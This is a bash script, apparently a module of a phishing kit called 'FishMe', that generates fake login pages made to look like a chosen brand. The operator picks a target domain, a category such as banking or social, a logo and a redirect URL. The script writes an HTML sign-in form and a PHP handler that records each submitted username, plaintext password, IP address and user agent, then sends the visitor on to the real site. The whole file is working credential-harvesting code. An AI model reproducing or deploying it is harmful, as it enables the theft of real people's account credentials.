#!/bin/bash

TEMPLATES_DIR="${BASE_DIR}/templates"
TEMPLATE_STYLES_DIR="${BASE_DIR}/.template_styles"

init_template_generator() {
    mkdir -p "$TEMPLATE_STYLES_DIR"
    create_default_styles
}

create_default_styles() {
    cat > "${TEMPLATE_STYLES_DIR}/modern.css" << 'EOF'
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
}
.login-container {
    background: white;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.2);
    width: 100%;
    max-width: 400px;
}
h1 {
    text-align: center;
    color: #333;
    margin-bottom: 30px;
}
.form-group {
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 12px;
    border: 2px solid #e1e1e1;
    border-radius: 6px;
    font-size: 16px;
    box-sizing: border-box;
    transition: border-color 0.3s;
}
input:focus {
    outline: none;
    border-color: #667eea;
}
button {
    width: 100%;
    padding: 14px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: transform 0.2s;
}
button:hover {
    transform: translateY(-2px);
}
EOF
    cat > "${TEMPLATE_STYLES_DIR}/corporate.css" << 'EOF'
body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
}
.login-container {
    background: white;
    padding: 50px;
    border-radius: 4px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    width: 100%;
    max-width: 450px;
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo img {
    max-width: 150px;
}
h1 {
    text-align: center;
    color: #2c3e50;
    margin-bottom: 20px;
    font-size: 24px;
}
.form-group {
    margin-bottom: 20px;
}
label {
    display: block;
    margin-bottom: 8px;
    color: #7f8c8d;
    font-size: 14px;
}
input {
    width: 100%;
    padding: 12px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 14px;
    box-sizing: border-box;
}
button {
    width: 100%;
    padding: 14px;
    background: #3498db;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    cursor: pointer;
}
button:hover {
    background: #2980b9;
}
EOF
    cat > "${TEMPLATE_STYLES_DIR}/dark.css" << 'EOF'
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #1a1a1a;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
}
.login-container {
    background: #2d2d2d;
    padding: 40px;
    border-radius: 8px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.5);
    width: 100%;
    max-width: 380px;
}
h1 {
    text-align: center;
    color: #ffffff;
    margin-bottom: 30px;
}
.form-group {
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 12px;
    background: #3d3d3d;
    border: 1px solid #4d4d4d;
    border-radius: 4px;
    color: #ffffff;
    font-size: 14px;
    box-sizing: border-box;
}
input::placeholder {
    color: #888;
}
button {
    width: 100%;
    padding: 14px;
    background: #4CAF50;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    cursor: pointer;
}
button:hover {
    background: #45a049;
}
EOF
}

list_styles() {
    echo "Available Template Styles:"
    echo "=========================="
    
    local i=1
    for style_file in "${TEMPLATE_STYLES_DIR}"/*.css; do
        if [[ -f "$style_file" ]]; then
            local style_name
            style_name=$(basename "$style_file" .css)
            printf "  ${GREEN}[%d]${RESET} ${BOLD}%s${RESET}\n" "$i" "$style_name"
            ((i++))
        fi
    done
}

create_template_interactive() {
    echo "FishMe Template Generator"
    echo "========================="
    echo ""
    read -p "Template name (slug): " template_name
    template_name=$(echo "$template_name" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]/_/g')
    
    if [[ -z "$template_name" ]]; then
        echo "Template name is required."
        return 1
    fi
    read -p "Display name: " display_name
    display_name=${display_name:-$template_name}
    read -p "Brand name: " brand
    brand=${brand:-Custom}
    read -p "Target domain (e.g., example.com): " domain
    domain=${domain:-example.com}
    echo "Categories: social, email, banking, shopping, corporate, other"
    read -p "Category: " category
    category=${category:-other}
    echo ""
    list_styles
    read -p "Select style [1-3]: " style_choice
    local style_file
    case "$style_choice" in
        1) style_file="${TEMPLATE_STYLES_DIR}/modern.css" ;;
        2) style_file="${TEMPLATE_STYLES_DIR}/corporate.css" ;;
        3) style_file="${TEMPLATE_STYLES_DIR}/dark.css" ;;
        *) style_file="${TEMPLATE_STYLES_DIR}/modern.css" ;;
    esac
    read -p "Primary color (hex, e.g., #007bff): " primary_color
    primary_color=${primary_color:-#007bff}
    read -p "Logo URL (optional, press Enter to skip): " logo_url
    read -p "Redirect URL after login: " redirect_url
    redirect_url=${redirect_url:-https://example.com}
    create_template_from_params "$template_name" "$display_name" "$brand" "$domain" "$category" "$style_file" "$primary_color" "$logo_url" "$redirect_url"
}

create_template_from_params() {
    local template_name="$1"
    local display_name="$2"
    local brand="$3"
    local domain="$4"
    local category="$5"
    local style_file="$6"
    local primary_color="$7"
    local logo_url="$8"
    local redirect_url="$9"
    
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ -d "$template_dir" ]]; then
        echo "Template '$template_name' already exists."
        return 1
    fi
    
    mkdir -p "$template_dir"
    cat > "${template_dir}/site.json" << EOF
{
  "name": "${display_name}",
  "slug": "${template_name}",
  "brand": "${brand}",
  "domain": "${domain}",
  "category": "${category}",
  "description": "Custom template created via FishMe Template Generator",
  "entry": "login.html",
  "allocated_url": "$(generate_allocated_url "$template_name")"
}
EOF
    local style_css
    style_css=$(cat "$style_file" 2>/dev/null)
    style_css=$(echo "$style_css" | sed "s/#667eea/${primary_color}/g")
    cat > "${template_dir}/login.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>${display_name} - Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
${style_css}
    </style>
</head>
<body>
    <div class="login-container">
EOF

    # Add logo if provided
    if [[ -n "$logo_url" ]]; then
        cat >> "${template_dir}/login.html" << EOF
        <div class="logo">
            <img src="${logo_url}" alt="${brand}">
        </div>
EOF
    fi
    cat >> "${template_dir}/login.html" << EOF
        <h1>Sign In</h1>
        <form action="login.php" method="POST">
            <div class="form-group">
                <input type="text" name="username" placeholder="Username or Email" required autocomplete="off">
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
EOF
    cat > "${template_dir}/login.php" << 'EOF'
<?php
require_once '../../config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitizeInput($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    
    if (!empty($username) && !empty($password)) {
        $capture = [
            'username' => $username,
            'password' => $password,
            'template' => basename(__DIR__),
            'ip' => getClientIP(),
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        saveCapture($capture);
        header('Location: REDIRECT_URL_PLACEHOLDER');
        exit;
    }
}
?>
EOF
    sed -i "s|REDIRECT_URL_PLACEHOLDER|${redirect_url}|g" "${template_dir}/login.php"
    cat > "${template_dir}/index.php" << EOF
<?php
header('Location: login.html');
exit;
?>
EOF
    
    echo "Template '$template_name' created successfully!"
    echo "Location: $template_dir"
    echo ""
    echo "Next steps:"
    echo "  1. Review and customize the HTML/CSS in login.html"
    echo "  2. Test the template by running: ./fishme start"
    echo "  3. Select template number from the list"
}

clone_template() {
    local source_template="$1"
    local new_template="$2"
    
    local source_dir="${TEMPLATES_DIR}/${source_template}"
    local new_dir="${TEMPLATES_DIR}/${new_template}"
    
    if [[ ! -d "$source_dir" ]]; then
        echo "Source template not found: $source_template"
        return 1
    fi
    
    if [[ -d "$new_dir" ]]; then
        echo "Template already exists: $new_template"
        return 1
    fi
    
    cp -r "$source_dir" "$new_dir"
    local site_json="${new_dir}/site.json"
    jq --arg slug "$new_template" --arg name "$new_template" '.slug = $slug | .name = $name' "$site_json" > "${site_json}.tmp"
    mv "${site_json}.tmp" "$site_json"
    
    echo "Template cloned: $source_template -> $new_template"
}

generate_allocated_url() {
    local template_name="$1"
    local random_string
    random_string=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
    echo "${template_name}-${random_string}.page.dev"
}

validate_generated_template() {
    local template_name="$1"
    local template_dir="${TEMPLATES_DIR}/${template_name}"
    
    if [[ ! -d "$template_dir" ]]; then
        echo "Template not found: $template_name"
        return 1
    fi
    
    local errors=0
    echo "Validating template: $template_name"
    echo "================================"
    local required_files=("site.json" "login.html" "login.php" "index.php")
    for file in "${required_files[@]}"; do
        if [[ -f "${template_dir}/${file}" ]]; then
            echo "  ${GREEN}[✓]${RESET} $file exists"
        else
            echo "  ${RED}[!]${RESET} $file missing"
            ((errors++))
        fi
    done
    if [[ -f "${template_dir}/site.json" ]]; then
        if jq empty "${template_dir}/site.json" 2>/dev/null; then
            echo "  ${GREEN}[✓]${RESET} site.json is valid JSON"
        else
            echo "  ${RED}[!]${RESET} site.json has invalid JSON"
            ((errors++))
        fi
    fi
    
    echo ""
    if [[ $errors -eq 0 ]]; then
        echo "  ${GREEN}Template is valid!${RESET}"
        return 0
    else
        echo "  ${RED}Template has $errors error(s)${RESET}"
        return 1
    fi
}
